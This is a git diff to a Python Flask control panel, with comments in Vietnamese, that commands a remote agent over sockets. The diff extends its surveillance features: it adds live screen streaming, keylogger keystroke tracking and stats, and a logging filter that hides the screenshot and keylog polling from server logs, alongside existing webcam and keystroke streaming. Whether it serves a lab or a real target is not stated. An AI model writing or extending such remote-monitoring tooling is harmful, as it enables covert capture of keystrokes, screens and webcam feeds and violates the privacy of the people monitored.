@@ -6,10 +6,20 @@ import os
 import threading
 import cv2
 import numpy as np
+import traceback
+import psutil
+import logging
 from flask import Flask, render_template, request, jsonify, Response
 from datetime import datetime
-
 app = Flask(__name__)
+
+class SuppressAutoRefreshFilter(logging.Filter):
+    def filter(self, record):
+        suppress_paths = ['/api/system/stats', '/api/keylog/stats', '/api/apps/recent', '/api/screenshot']
+        return not any(path in record.getMessage() for path in suppress_paths)
+
+werkzeug_logger = logging.getLogger('werkzeug')
+werkzeug_logger.addFilter(SuppressAutoRefreshFilter())
 
 # --- CẤU HÌNH KẾT NỐI ---
 VM_IP = "127.0.0.1"
@@ -19,13 +29,21 @@ DATA_PORT = 8889
 LIVESTREAM_PORT = 8890
 KEYLOG_PORT = 8891
 
-HEADER_FORMAT = '=HHIIIII'
+HEADER_FORMAT = '>HHIIIII'
 HEADER_SIZE = 24
 
 # Global persistent socket connections
 _cmd_socket = None
 _data_socket = None
 _socket_lock = threading.Lock()
+_cmd_lock = threading.Lock()
+
+_keylog_stats = {
+    'total_keys': 0,
+    'session_keys': 0,
+    'last_activity': None,
+    'is_running': False
+}
 
 def get_persistent_sockets():
     """Get or create persistent socket connections"""
@@ -92,21 +110,23 @@ def send_command_packet(cmd_str):
         print(f"Lỗi gửi lệnh '{cmd_str}': {e}")
         return f"Error: {str(e)}"
 
-def receive_large_data(trigger_cmd):
+def receive_large_data(trigger_cmd, silent=False):
     """Gửi lệnh và nhận dữ liệu lớn (CSV, Ảnh) từ cổng Data"""
     try:
         cmd_sock, data_sock = get_persistent_sockets()
         
         # B1: Gửi lệnh qua Command socket
-        cmd_sock.sendall(trigger_cmd.encode())
-        print(f"[DEBUG] Sent command: {trigger_cmd}")
+        with _cmd_lock:
+            cmd_sock.sendall(trigger_cmd.encode())
+        
+        if not silent:
+            print(f"[DEBUG] Sent command: {trigger_cmd}")
         
         # Chờ server xử lý
-        time.sleep(0.3)
+        time.sleep(0.2 if silent else 0.3)
 
         # B2: Sử dụng data socket đã kết nối
-        data_sock.settimeout(15)
-        print(f"[DEBUG] Using persistent data socket")
+        data_sock.settimeout(10 if silent else 15)
         
         # B3: Nhận data
         full_payload = bytearray()
@@ -118,84 +138,94 @@ def receive_large_data(trigger_cmd):
             while len(header_data) < HEADER_SIZE:
                 packet = data_sock.recv(HEADER_SIZE - len(header_data))
                 if not packet:
-                    print(f"[ERROR] Connection closed while reading header")
                     break
                 header_data += packet
             
             if len(header_data) < HEADER_SIZE:
                 if chunks_received == 0:
-                    print(f"[ERROR] No data received from server")
-                else:
-                    print(f"[INFO] Received {chunks_received} chunks, closing")
+                    if not silent:
+                        print(f"[ERROR] No header data received")
+                    return None
                 break
             
-            # Giải mã Header
+            # Giải mã Header - Big-endian network byte order
             try:
-                cmd, res = struct.unpack('<HH', header_data[:4])
-                total, curr, size, total_size, checksum = struct.unpack('!IIIII', header_data[4:])
+                cmd, res, total, curr, size, total_size, checksum = struct.unpack('>HHIIIII', header_data)
                 
-                print(f"[DEBUG] Header: cmd={cmd}, total={total}, curr={curr}, size={size}, total_size={total_size}")
+                if not silent and chunks_received == 0:
+                    print(f"[DEBUG] Header: cmd={cmd}, total={total}, curr={curr}, size={size}")
             except struct.error as e:
-                print(f"[ERROR] Failed to unpack header: {e}")
-                print(f"[DEBUG] Header bytes: {header_data.hex()}")
-                break
+                if not silent:
+                    print(f"[ERROR] Failed to unpack header: {e}")
+                return None
             
             # VALIDATION
             MAX_CHUNK_SIZE = 5 * 1024 * 1024
             if size > MAX_CHUNK_SIZE or size <= 0:
-                print(f"[ERROR] Invalid chunk size: {size} bytes")
-                break
+                if not silent:
+                    print(f"[ERROR] Invalid chunk size: {size} bytes")
+                return None
             
             # Đọc dữ liệu Chunk
-            print(f"[DEBUG] Reading chunk {curr+1}/{total}, size={size} bytes...")
-            chunk_data = b''
+            if not silent:
+                print(f"[DEBUG] Reading chunk {curr+1}/{total}, size={size} bytes...")
             
+            chunk_data = b''
             while len(chunk_data) < size:
                 remaining = size - len(chunk_data)
-                to_read = min(8192, remaining)
+                to_read = min(65536, remaining)
                 
                 try:
                     packet = data_sock.recv(to_read)
                     if not packet:
-                        print(f"[ERROR] Connection closed after {len(chunk_data)}/{size} bytes")
                         break
                     chunk_data += packet
                         
                 except socket.timeout:
-                    print(f"[TIMEOUT] Socket timeout after {len(chunk_data)}/{size} bytes")
-                    break
+                    if not silent:
+                        print(f"[ERROR] Socket timeout reading chunk data")
+                    return None
             
             if len(chunk_data) != size:
-                print(f"[ERROR] Incomplete chunk: expected {size}, got {len(chunk_data)} bytes")
-                break
+                if not silent:
+                    print(f"[ERROR] Incomplete chunk: expected {size}, got {len(chunk_data)} bytes")
+                return None
             
             full_payload.extend(chunk_data)
             chunks_received += 1
-            print(f"[SUCCESS] Chunk {curr+1}/{total} complete ({len(chunk_data)} bytes)")
+            
+            if not silent:
+                print(f"[SUCCESS] Chunk {curr+1}/{total} complete ({len(chunk_data)} bytes)")
             
             if curr >= total - 1:
-                print(f"[COMPLETE] All {total} chunks received, total {len(full_payload)} bytes")
                 break
         
         # B4: Đọc response từ cmd_sock
         try:
-            cmd_sock.settimeout(0.5)
+            cmd_sock.settimeout(0.1)
             response = cmd_sock.recv(4096)
-            print(f"[DEBUG] Server response: {response.decode('utf-8', errors='ignore').strip()}")
+            if not silent:
+                print(f"[DEBUG] Server response: {response.decode('utf-8', errors='ignore').strip()}")
         except socket.timeout:
-            print(f"[DEBUG] No response from server")
+            pass
         
         if len(full_payload) > 0:
-            print(f"[FINAL] Returning {len(full_payload)} bytes")
+            if not silent:
+                print(f"[FINAL] Returning {len(full_payload)} bytes")
             return full_payload
         else:
-            print(f"[FINAL] No payload received")
+            if not silent:
+                print(f"[FINAL] No payload received")
             return None
         
+    except socket.timeout as e:
+        if not silent:
+            print(f"[ERROR] Socket timeout: {e}")
+        return None
     except Exception as e:
-        print(f"[ERROR] Exception: {e}")
-        import traceback
-        traceback.print_exc()
+        if not silent:
+            print(f"[ERROR] Exception: {e}")
+            traceback.print_exc()
         
         # Reset connections on error
         global _cmd_socket, _data_socket
@@ -212,6 +242,7 @@ def receive_large_data(trigger_cmd):
                 except:
                     pass
                 _data_socket = None
+        
         return None
     
 # --- API ROUTES ---
@@ -253,8 +284,8 @@ def list_items(type):
             elif type == 'apps' and len(parts) >= 4:
                 data.append({
                     'name': parts[1].strip('"'),
-                    'ver': parts[2].strip('"'),
-                    'loc': parts[3].strip('"')
+                    'version': parts[2].strip('"'),
+                    'publisher': parts[3].strip('"')
                 })
         return jsonify(data)
     except Exception as e:
@@ -278,19 +309,20 @@ def control_action():
 @app.route('/api/screenshot')
 def screenshot():
     """Chụp màn hình"""
+    # Check if this is for saving or just viewing
+    save_to_disk = request.args.get('save', 'true').lower() == 'true'
+    
     img_bytes = receive_large_data("SCREEN_CAPTURE")
     if img_bytes:
-        # Tạo thư mục lưu ảnh
-        os.makedirs('screenshots', exist_ok=True)
-        
-        # Tạo tên file với timestamp
-        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-        filename = f'screenshots/screenshot_{timestamp}.jpg'
-        
-        # Lưu file
-        with open(filename, 'wb') as f:
-            f.write(img_bytes)
-        print(f"[SAVED] Screenshot saved to {filename}")
+        # Chỉ lưu file khi được yêu cầu rõ ràng
+        if save_to_disk:
+            os.makedirs('screenshots', exist_ok=True)
+            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+            filename = f'screenshots/screenshot_{timestamp}.jpg'
+            
+            with open(filename, 'wb') as f:
+                f.write(img_bytes)
+            print(f"[SAVED] Screenshot saved to {filename}")
         
         return Response(bytes(img_bytes), mimetype='image/jpeg')
     return "Error capturing screen", 500
@@ -404,6 +436,101 @@ def webcam_stream():
 def video_feed():
     return Response(webcam_stream(), mimetype='multipart/x-mixed-replace; boundary=frame')
 
+def screen_stream():
+    """Stream màn hình real-time (MJPEG)"""
+    send_command_packet("LIVESTREAM")  # Reuse livestream command hoặc tạo SCREENSTREAM riêng
+    time.sleep(0.5)
+    
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((VM_IP, LIVESTREAM_PORT))  # Hoặc tạo SCREEN_PORT riêng
+        
+        while True:
+            # Request screenshot từ C++ server
+            # C++ sẽ gửi JPEG frames liên tục qua DATA_PORT
+            size_data = sock.recv(4)
+            if not size_data: break
+            
+            size = struct.unpack('i', size_data)[0]
+            if size > 10000000: continue
+            
+            img_data = b''
+            while len(img_data) < size:
+                packet = sock.recv(size - len(img_data))
+                if not packet: break
+                img_data += packet
+                
+            yield (b'--frame\r\n'
+                   b'Content-Type: image/jpeg\r\n\r\n' + img_data + b'\r\n')
+    except Exception as e:
+        print(f"Screen Stream Error: {e}")
+
+
+@app.route('/api/screen/stream', methods=['POST'])
+def screen_stream_control():
+    """Start/Stop screen streaming"""
+    action = request.json.get('action')
+    if action == 'start':
+        send_command_packet("SCREENSTREAM")
+        return jsonify({'status': 'Screen streaming started'})
+    else:
+        send_command_packet("STOPSCREENSTREAM")
+        return jsonify({'status': 'Screen streaming stopped'})
+
+@app.route('/screen_feed')
+def screen_feed():
+    """Stream màn hình real-time với polling"""
+    return Response(screen_stream_simple(), mimetype='multipart/x-mixed-replace; boundary=frame')
+
+def screen_stream_simple():
+    """Stream màn hình bằng cách gọi SCREEN_CAPTURE liên tục"""
+    import time
+    
+    fps = 10  # 10 FPS
+    delay = 1.0 / fps
+    frame_count = 0
+    
+    print("[SCREEN_STREAM] Starting screen stream...")
+    
+    while True:
+        try:
+            start_time = time.time()
+            
+            # Capture screen với receive_large_data_silent
+            img_bytes = receive_large_data("SCREEN_CAPTURE", silent=True)
+            
+            if img_bytes and len(img_bytes) > 0:
+                frame_count += 1
+                # Log every 50 frames
+                if frame_count % 50 == 0:
+                    print(f"[SCREEN_STREAM] Streaming... ({frame_count} frames, {len(img_bytes)} bytes/frame)")
+                
+                yield (b'--frame\r\n'
+                       b'Content-Type: image/jpeg\r\n\r\n' + bytes(img_bytes) + b'\r\n')
+            else:
+                # Chỉ log mỗi 10 lần thất bại để tránh spam
+                if frame_count == 0 or frame_count % 10 == 0:
+                    print(f"[SCREEN_STREAM] No data received (attempt #{frame_count}), retrying...")
+                time.sleep(0.5)
+                continue
+            
+            # Maintain FPS
+            elapsed = time.time() - start_time
+            sleep_time = max(0, delay - elapsed)
+            time.sleep(sleep_time)
+            
+        except GeneratorExit:
+            print(f"[SCREEN_STREAM] Client disconnected (streamed {frame_count} frames)")
+            break
+        except Exception as e:
+            print(f"[SCREEN_STREAM] Error: {e}")
+            import traceback
+            traceback.print_exc()
+            time.sleep(1)
+
+
+# --- KEYLOGGER STATS TRACKING ---
+
 @app.route('/api/webcam/off', methods=['POST'])
 def webcam_off():
     global _video_writer, _is_recording
@@ -423,10 +550,17 @@ def webcam_off():
 # --- KEYLOGGER STREAMING (SSE) ---
 @app.route('/api/keylog/toggle', methods=['POST'])
 def keylog_toggle():
+    global _keylog_stats
+    
     state = request.json.get('state')
     cmd = "KEYLOG" if state else "STOPKEYLOG"
     
-    # Chỉ gửi lệnh
+    if state:
+        _keylog_stats['session_keys'] = 0
+        _keylog_stats['is_running'] = True
+    else:
+        _keylog_stats['is_running'] = False
+    
     send_command_packet(cmd)
     time.sleep(0.5)
     
@@ -434,8 +568,9 @@ def keylog_toggle():
 
 @app.route('/api/keylog/stream')
 def stream_keys():
+    global _keylog_stats
+    
     def events():
-        # Retry kết nối
         max_retries = 10
         sock = None
         
@@ -446,6 +581,7 @@ def stream_keys():
                 sock.connect((VM_IP, KEYLOG_PORT))
                 sock.settimeout(None)
                 print(f"[KEYLOG] Connected on attempt {retry_count + 1}")
+                _keylog_stats['is_running'] = True
                 break
             except Exception as e:
                 print(f"[KEYLOG] Attempt {retry_count + 1}/{max_retries} failed: {e}")
@@ -462,7 +598,6 @@ def stream_keys():
                     yield "data: [ERROR] Cannot connect after 10 attempts\n\n"
                     return
         
-        # Stream data
         try:
             while True:
                 data = sock.recv(1024)
@@ -470,11 +605,19 @@ def stream_keys():
                     break
                 
                 decoded = data.decode(errors='ignore')
+                
+                # Track keystroke count
+                key_count = decoded.count('[')
+                _keylog_stats['total_keys'] += key_count
+                _keylog_stats['session_keys'] += key_count
+                _keylog_stats['last_activity'] = datetime.now()
+                
                 yield f"data: {decoded}\n\n"
                     
         except Exception as e:
             print(f"[KEYLOG ERROR] {e}")
         finally:
+            _keylog_stats['is_running'] = False
             if sock:
                 try:
                     sock.close()
@@ -483,6 +626,134 @@ def stream_keys():
             yield "data: [DISCONNECTED]\n\n"
     
     return Response(events(), mimetype="text/event-stream")
+
+@app.route('/api/keylog/stats')
+def keylog_stats():
+    """Lấy thống kê keylogger"""
+    global _keylog_stats
+    
+    last_activity_str = "Never"
+    if _keylog_stats['last_activity']:
+        delta = datetime.now() - _keylog_stats['last_activity']
+        if delta.seconds < 60:
+            last_activity_str = f"{delta.seconds}s ago"
+        elif delta.seconds < 3600:
+            last_activity_str = f"{delta.seconds // 60}m ago"
+        else:
+            last_activity_str = f"{delta.seconds // 3600}h ago"
+    
+    return jsonify({
+        'is_running': _keylog_stats['is_running'],
+        'total_keys': _keylog_stats['total_keys'],
+        'session_keys': _keylog_stats['session_keys'],
+        'last_activity': last_activity_str
+    })
+
+@app.route('/api/system/stats')
+def system_stats():
+    """Lấy thống kê hệ thống từ C++ server."""
+    try:
+        response = send_command_packet("SYSTEM_STATS")
+        if not response or "Error" in response:
+            raise Exception(f"Invalid response: {response}")
+
+        try:
+            first_brace = response.find('{')
+            if first_brace != -1:
+                json_text = response[first_brace:]
+            else:
+                json_text = response
+
+            stats = json.loads(json_text)
+            return jsonify(stats)
+        except Exception as je:
+            if "CHUNKED" in response:
+                raw = receive_large_data("SYSTEM_STATS")
+                if raw:
+                    try:
+                        stats = json.loads(raw.decode('utf-8', errors='ignore'))
+                        return jsonify(stats)
+                    except Exception as je2:
+                        raise
+
+            raise Exception(f"Invalid JSON from C++: {response}")
+    except Exception as e:
+        # Fallback local stats
+        cpu_percent = psutil.cpu_percent(interval=0.1)
+        mem = psutil.virtual_memory()
+        mem_used_gb = mem.used / (1024**3)
+        mem_total_gb = mem.total / (1024**3)
+
+        boot_time = psutil.boot_time()
+        uptime_seconds = time.time() - boot_time
+        uptime_hours = int(uptime_seconds // 3600)
+        uptime_minutes = int((uptime_seconds % 3600) // 60)
+
+        disk = psutil.disk_usage('/')
+        disk_used_gb = disk.used / (1024**3)
+        disk_total_gb = disk.total / (1024**3)
+
+        net_io = psutil.net_io_counters()
+
+        return jsonify({
+            'cpu_percent': round(cpu_percent, 1),
+            'mem_used_gb': round(mem_used_gb, 1),
+            'mem_total_gb': round(mem_total_gb, 1),
+            'mem_percent': round(mem.percent, 1),
+            'uptime': f"{uptime_hours}h {uptime_minutes}m",
+            'process_count': len(psutil.pids()),
+
+            'disk_used_gb': round(disk_used_gb, 1),
+            'disk_total_gb': round(disk_total_gb, 1),
+            'disk_percent': round(disk.percent, 1),
+            'net_sent_mb': round(net_io.bytes_sent / (1024**2), 1),
+            'net_recv_mb': round(net_io.bytes_recv / (1024**2), 1)
+        })
+
+@app.route('/api/apps/recent')
+def recent_apps():
+    """Lấy danh sách apps gần đây"""
+    recent = [
+        {'name': 'Chrome', 'icon': 'fa-brands fa-chrome', 'path': 'chrome.exe'},
+        {'name': 'VS Code', 'icon': 'fa-solid fa-code', 'path': 'code.exe'},
+        {'name': 'Terminal', 'icon': 'fa-solid fa-terminal', 'path': 'cmd.exe'},
+        {'name': 'Discord', 'icon': 'fa-brands fa-discord', 'path': 'discord.exe'}
+    ]
+    return jsonify(recent)
+
+@app.route('/api/network/stats')
+def network_stats():
+    """Lấy thống kê mạng"""
+    try:
+        net_io = psutil.net_io_counters()
+        
+        # Calculate speed (bytes/sec) - requires tracking previous values
+        global _last_net_io, _last_net_time
+        current_time = time.time()
+        
+        if '_last_net_io' not in globals():
+            _last_net_io = net_io
+            _last_net_time = current_time
+            download_speed = 0
+            upload_speed = 0
+        else:
+            time_delta = current_time - _last_net_time
+            download_speed = (net_io.bytes_recv - _last_net_io.bytes_recv) / time_delta
+            upload_speed = (net_io.bytes_sent - _last_net_io.bytes_sent) / time_delta
+            _last_net_io = net_io
+            _last_net_time = current_time
+        
+        return jsonify({
+            'download_speed_mb': round(download_speed / (1024*1024), 2),
+            'upload_speed_mb': round(upload_speed / (1024*1024), 2),
+            'total_sent_gb': round(net_io.bytes_sent / (1024**3), 2),
+            'total_recv_gb': round(net_io.bytes_recv / (1024**3), 2),
+            'packets_sent': net_io.packets_sent,
+            'packets_recv': net_io.packets_recv,
+            'connections': len(psutil.net_connections())
+        })
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5001, debug=True)
